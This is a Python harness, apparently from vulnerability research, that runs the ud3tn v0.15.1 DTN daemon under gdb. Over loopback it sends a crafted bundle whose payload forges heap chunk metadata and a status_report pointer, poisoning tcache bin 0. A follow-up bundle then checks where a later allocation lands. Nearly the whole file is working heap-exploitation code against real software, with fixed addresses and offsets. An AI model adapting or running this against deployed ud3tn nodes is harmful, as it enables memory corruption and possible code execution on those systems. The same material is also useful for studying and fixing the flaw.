#!/usr/bin/env python3
"""Loopback-only: forge a valid record chunk size so every post-parse free
completes, leaving the forged status_report pointer at the head of tcache bin
0; then send a follow-up bundle and observe where its malloc(1) lands.

Usage:
  python3 harness/tcache_chain.py --binary .../ud3tn-v0.15.1-plain/build/posix/ud3tn \
      --outdir .../chain-w1 --port 23624
"""
import argparse
import os
import pathlib
import socket
import subprocess
import sys
import time

HERE = pathlib.Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
from wire_trigger import PREFIX_HEX, cbor_byte_string_header, sdnv_encode  # noqa: E402
from gdb_probe import make_variable_bundle  # noqa: E402

# ASLR is disabled by gdb; the W26 groomed layout is reproducible:
# one-byte source-EID chunk p, administrative record at p+0x100.
P = 0x7FFFF0001040
F = P + 0x300


def custom_bundle(payload, eid_len=0, seq=1):
    prefix = bytearray.fromhex(PREFIX_HEX)
    assert len(prefix) == 91
    prefix[90] = eid_len
    prefix[17] = seq
    prefix[12:17] = sdnv_encode(int(time.time()))
    n = 6 + len(payload)
    assert 128 <= n < 16384
    prefix[84:85] = bytes([0x80 | (n >> 7), n & 0x7F])
    bundle = bytes(prefix) + bytes(payload)
    return cbor_byte_string_header(len(bundle)) + bundle


def forged_payload(count=768):
    buf = bytearray(count)

    def put(off, val, size=8):
        buf[off:off + size] = int(val).to_bytes(size, "little")

    put(0xF8, 0x41)       # record-8: valid size word, tcache bin 1
    put(0x110, F)         # record->status_report = forged chunk F
    put(0x18, 0x25)       # live chunk at p+0x20: keep its size word valid
    put(0x38, 0x65)       # live chunk at p+0x40 (pre-bundle record)
    put(0x98, 0x45)       # live chunk at p+0xa0 (pre-bundle status report)
    put(0x158, 0x1FE71)   # top chunk size at p+0x158 (0x1fe70)
    put(0xD8, 0x25)       # live chunk at p+0xe0
    put(0x140, 2)         # record->bundle_source_eid.scheme = IPN: eid_free no-op
    put(0x2F8, 0x31)      # F-8: valid size word, tcache bin 1
    return bytes(buf)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--binary", required=True)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--port", type=int, default=23624)
    ap.add_argument("--forged-eid-len", type=int, default=0)
    ap.add_argument("--script", default=str(HERE / "tcache_chain.gdb"))
    args = ap.parse_args()
    outdir = pathlib.Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)
    cmd = [
        "gdb", "-q", "-batch", "-x", args.script, "--args", args.binary,
        "-b", "6", "-e", "dtn://ud3tn.dtn/",
        "-c", f"mtcp:127.0.0.1,{args.port}",
        "-s", str(outdir / "chain.aap.sock"),
        "-S", str(outdir / "chain.aap2.sock"),
        "-L", "4",
    ]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True)
    deadline = time.time() + 10

    def send(payload):
        while time.time() < deadline:
            try:
                with socket.create_connection(("127.0.0.1", args.port),
                                              timeout=1) as s:
                    s.sendall(payload)
                return True
            except OSError:
                if proc.poll() is not None:
                    return False
                time.sleep(0.1)
        return False

    results = []
    results.append(("pre", send(make_variable_bundle(0x41, 64, 8, seq=1))))
    time.sleep(0.4)
    results.append(("forge", send(custom_bundle(forged_payload(), args.forged_eid_len, seq=2))))
    time.sleep(0.6)
    results.append(("follow", send(make_variable_bundle(0x43, 64, 0x27, seq=3))))
    try:
        out, _ = proc.communicate(timeout=45)
    except subprocess.TimeoutExpired:
        proc.kill()
        out, _ = proc.communicate()
    log = outdir / "chain.log"
    log.write_text(out)
    print("sent:", results, "rc:", proc.returncode, "log:", log)
    for line in out.splitlines():
        if line.startswith(("STORE_BEGIN", "FREE_REC", "LIBC_FREE",
                            "CHAIN_STOP")) or "invalid pointer" in line \
                or "SIG" in line or "free_administrative_record" in line:
            print("   ", line)
    print("F:", hex(F))


if __name__ == "__main__":
    main()
